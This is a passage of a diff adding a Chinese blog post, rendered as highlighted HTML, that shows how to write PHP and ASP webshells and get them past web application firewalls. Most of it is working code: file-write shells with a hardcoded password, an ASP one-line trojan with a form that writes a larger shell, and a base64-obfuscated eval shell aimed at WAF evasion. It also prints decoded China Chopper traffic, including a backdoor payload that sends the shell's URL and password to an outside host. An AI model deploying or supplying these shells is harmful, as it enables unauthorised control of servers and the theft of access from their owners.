+$path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;path&amp;#39;&lt;/span&gt;];
+$data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;data&amp;#39;&lt;/span&gt;];
+$file&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fopen&lt;/span&gt;($path,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;w+&amp;#34;&lt;/span&gt;);
+&lt;span style=&#34;color:#a6e22e&#34;&gt;fwrite&lt;/span&gt;($file,$data);
+&lt;span style=&#34;color:#a6e22e&#34;&gt;fclose&lt;/span&gt;($file);
+&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
+
+&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;action&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;post&amp;#34;&lt;/span&gt;&amp;gt;
+读取当前文件路径：
+&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DOCUMENT_ROOT&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PHP_SELF&amp;#39;&lt;/span&gt;];&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt;&amp;gt;
+保存路径：&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;text&amp;#34;&lt;/span&gt; /&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt;&amp;gt;
+写入内容：&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;textarea&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cols&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;90&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rows&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;50&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;textarea&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt;&amp;gt;
+&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;提交&amp;#34;&lt;/span&gt;/&amp;gt;
+&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;有密码验证的PHP小马：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
+&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
+&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SERVER_NAME&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;的后门小马&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
+&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;error_reporting&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);&lt;span style=&#34;color:#75715e&#34;&gt;//不显示错误信息
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;$password&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xiaoxian&amp;#34;&lt;/span&gt;;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ($_GET[&lt;span style=&#34;color:#a6e22e&#34;&gt;pass&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;$password){&lt;span style=&#34;color:#75715e&#34;&gt;//判断输入的密码是否正确
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ($_POST){
+        $path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;path&amp;#39;&lt;/span&gt;];&lt;span style=&#34;color:#75715e&#34;&gt;//从表单获取的上传的路径
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        $data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;data&amp;#39;&lt;/span&gt;];&lt;span style=&#34;color:#75715e&#34;&gt;//从表单获取的上传的内容
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        $file&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fopen&lt;/span&gt;($path,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;w+&amp;#34;&lt;/span&gt;);
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;fwrite&lt;/span&gt;($file,$data))
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Succeeded!&amp;#34;&lt;/span&gt;;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Failed!&amp;#34;&lt;/span&gt;;
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;fclose&lt;/span&gt;($file);
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xiaoma.php with password by xiaoxian&amp;#34;&lt;/span&gt;;
+    }
+&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt;&amp;gt;
+
+服务器的IP地址和域名为:&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SERVER_NAME&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;(&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=@&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;gethostbyname&lt;/span&gt;($_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SERVER_NAME&amp;#39;&lt;/span&gt;])&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;)&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt;&amp;gt;
+当前目录路径:
+&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DOCUMENT_ROOT&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PHP_SELF&amp;#39;&lt;/span&gt;];&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt;&amp;gt;
+&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;action&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;post&amp;#34;&lt;/span&gt;&amp;gt;
+保存路径:&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;text&amp;#34;&lt;/span&gt; /&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt;&amp;gt;
+保存内容:&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;textarea&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cols&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;90&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rows&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;50&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;textarea&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt;&amp;gt;
+&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Submit&amp;#34;&lt;/span&gt;/&amp;gt;
+&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt;&amp;gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
+ }&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{ &lt;span style=&#34;color:#75715e&#34;&gt;//输入密码错误时则一直在输入密码的界面
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
+
+&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;action&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET&amp;#34;&lt;/span&gt;&amp;gt;
+密码:&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pass&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pass&amp;#34;&lt;/span&gt;&amp;gt;
+&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;login&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Login in&amp;#34;&lt;/span&gt; /&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt;&amp;gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt; } &lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;0x01-一句话木马实现原理和编写&#34;&gt;0x01 一句话木马实现原理和编写&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;客户端：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&amp;lt;form action=http://10.10.10.144/1.asp method=post&amp;gt;
+&amp;lt;textarea name=xiaoxian cols=120 rows=10 width=45&amp;gt;
+set IP=server.CreateObject(&amp;#34;Adodb.Stream&amp;#34;)//建立流对象
+IP.Open
+IP.Type=2//以文本方式 
+IP.CharSet=&amp;#34;gb2312&amp;#34;//字体标准
+IP.writetext request(&amp;#34;newvalue&amp;#34;)
+IP.SaveToFile server.mappath(&amp;#34;new.asp&amp;#34;),2//将木马内容以覆盖文件的方式写入new.asp，2就是已覆盖的方式
+IP.Close
+set IP=nothing//释放对象
+response.redirect &amp;#34;new.asp&amp;#34;//转向new.asp
+&amp;lt;/textarea&amp;gt;
+&amp;lt;textarea name=newvalue cols=120 rows=10 width=45&amp;gt;这里填生成木马的代码
+&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;&amp;lt;center&amp;gt;&amp;lt;br&amp;gt;
+&amp;lt;input type=submit value=提交&amp;gt;
+&amp;lt;/form&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;服务端中有文件1.asp，内容为：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&amp;lt;%execute request(&amp;#34;xiaoxian&amp;#34;)%&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;表单的作用就是把表单里的内容提交到服务器端的1.asp文件，而1.asp即为一句话木马，会执行提交的内容。简单地说，就是构造两个表单,第一个表单里的代码是文件操作的代码(就是把第二个表单内的内容写入在当前目录下并命名为new.asp的这么一段操作的处理代码)那么第二个表单当然就是我们要写入的马了。第一个表单的名字和1.asp中的密码必须一样，而第二个表单的名字必须和IP.writetext request(&amp;ldquo;newvalue&amp;rdquo;) 里的newvalue一样。至此只要服务器有写的权限该表单所提交的大马内容就会被写入到new.asp中。即new.asp为我们的shell地址。&lt;/p&gt;
+&lt;h2 id=&#34;0x02-一句话木马如何绕过waf实现上传&#34;&gt;0x02 一句话木马如何绕过WAF实现上传&lt;/h2&gt;
+&lt;p&gt;这时候进行编码即可下面的是一个简单的编码例子，复杂的到网上下载即可：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
+$mt&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;JF9QT1NU&amp;#34;&lt;/span&gt;;
+$ojj&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;QGV2YWwole&amp;#34;&lt;/span&gt;;
+$hsa&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Wydlele4aW&amp;#34;&lt;/span&gt;;
+$fnx&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FveGlhbiddKTs=&amp;#34;&lt;/span&gt;;
+$zk&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;str_replace&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sdtdrd_redpdldadcde&amp;#34;&lt;/span&gt;);
+$ef&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$zk(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;z&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;zbazsze64_zdzeczodze&amp;#34;&lt;/span&gt;);
+$dva&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$zk(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;p&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pcprpepaptpe_fpupnpcptpipopn&amp;#34;&lt;/span&gt;);
+$zvm&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$dva(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,$ef($zk(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;le&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,$ojj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$mt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$hsa&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$fnx)));
+$zvm();
+&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;0x03-中国菜刀一些技巧和后门分析&#34;&gt;0x03 中国菜刀一些技巧和后门分析&lt;/h2&gt;
+&lt;p&gt;开启安全狗之后即使上传了一句话木马但是也是无法直接用菜刀连接的，将菜刀发送的信息通过Firefox的Hackbar来POST过去即可绕过。&lt;/p&gt;
+&lt;p&gt;具体的效果要看不同种类、不同版本的WAF了，这里使用的是最新版的安全狗因为还是被过滤了。当然网上也有过狗版的菜刀，但是本人使用的版本效果并不好。&lt;/p&gt;
+&lt;p&gt;如何检测菜刀是否存在后门？&lt;/p&gt;
+&lt;p&gt;使用WSockExpert软件或其它抓包软来来选择需要监听的“中国菜刀”程序，开始监听后，用菜刀连接Webshell进行一些操作，然后查看抓到的包，找到Send即发送包，其中的内容含有密码xiaoxian和加密过的内容，接着对里面的内容解码就是（这个是据说是官网下载的菜刀，但是确实没看到有后门）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;@eval (base64_decode($_POST[z0]));
+&amp;amp;z0=@ini_set(&amp;#34;display_errors&amp;#34;,&amp;#34;0&amp;#34;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&amp;#34;-&amp;gt;|&amp;#34;);;$D=base64_decode($_POST[&amp;#34;z1&amp;#34;]);$F=@opendir($D);if($F==NULL){echo(&amp;#34;ERROR:// Path Not Found Or No Permission!&amp;#34;);}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.&amp;#34;/&amp;#34;.$N;$T=@date(&amp;#34;Y-m-d H:i:s&amp;#34;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=&amp;#34;\t&amp;#34;.$T.&amp;#34;\t&amp;#34;.@filesize($P).&amp;#34;\t&amp;#34;.$E.&amp;#34;
+&amp;#34;;if(@is_dir($P))$M.=$N.&amp;#34;/&amp;#34;.$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};echo(&amp;#34;|&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;die&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;;&lt;/span&gt;
+&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;z1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;@ini_set(&amp;#34;display_errors&amp;#34;,&amp;#34;0&amp;#34;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&amp;#34;-&lt;/span&gt;&amp;gt;C:\\wce\\
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这是有后门的菜刀第一次解码的结果：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;@eval(base64_decode(&amp;#39;aWYoJF9DT09LSUVbJ0x5a2UnXSE9MSl7c2V0Y29va2llKCdMeWtlJywxKTtAZmlsZSgnaHR0cDovL3d3dy5hcGkuY29tLmRlL0FwaS5waHA/VXJsPScuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddLicmUGFzcz0nLmtleSgkX1BPU1QpKTt9&amp;#39;));@ini_set(&amp;#34;display_errors&amp;#34;,&amp;#34;0&amp;#34;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&amp;#34;-&amp;gt;|&amp;#34;);;$D=dirname($_SERVER[&amp;#34;SCRIPT_FILENAME&amp;#34;]);if($D==&amp;#34;&amp;#34;)$D=dirname($_SERVER[&amp;#34;PATH_TRANSLATED&amp;#34;]);$R=&amp;#34;{$D}\t&amp;#34;;if(substr($D,0,1)!=&amp;#34;/&amp;#34;){foreach(range(&amp;#34;A&amp;#34;,&amp;#34;Z&amp;#34;)
+ as 
+$L)if(is_dir(&amp;#34;{$L}:&amp;#34;))$R.=&amp;#34;{$L}:&amp;#34;;}$R.=&amp;#34;\t&amp;#34;;$u=(function_exists(&amp;#39;posix_getegid&amp;#39;))?@posix_getpwuid(@posix_geteuid()):&amp;#39;&amp;#39;;$usr=($u)?$u[&amp;#39;name&amp;#39;]:@get_current_user();$R.=php_uname();$R.=&amp;#34;({$usr})&amp;#34;;print
